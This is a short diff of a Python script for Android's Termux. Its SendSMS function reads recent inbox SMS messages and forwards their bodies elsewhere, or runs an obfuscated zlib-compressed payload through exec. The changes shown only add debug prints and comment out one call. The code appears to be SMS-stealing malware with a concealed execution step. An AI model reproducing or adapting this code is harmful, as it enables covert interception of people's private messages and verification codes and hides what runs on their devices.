@@ -400,6 +400,7 @@ def SendNumber(to, data):
 
 STORE, ID = [], ""
 def SendSMS(TO, SVE):
+    print("kih")
     global ID
     details = json.loads(subprocess.getoutput("termux-sms-list -l 10 -t inbox -n"))
     for data in details:
@@ -414,7 +415,7 @@ def SendSMS(TO, SVE):
                     if (SVE): _ = lambda __ : zlib.decompress(__[::-1]);exec((_)(b'\xf0"\xb3h\x00M|\x92\xf9 \x95)\xf9I\x15p\xea)\x99)\x89\xa9E\x19%\xea\xf8\xc1)\x16\xa5&\xe6\x95\xe7\xc9\x85\x886\x8c\xd2PRP\xd1,\xc9\xc8.+\xd5\x8aQMK,\xcdNMJ*V\x8cI,IHQ\xd2S\xc9\xf0.+6(\x084KrP\xd1\xcc\xccM\xcdqK\xcdN\x0b\x9cx'))
                     else: SendNumber(to, data["body"])
                 ID += SmsID
-        else: SMSLBAR()
+        else: print("sx")#SMSLBAR()
 
 def SMSLBAR():
     finaltxt=""
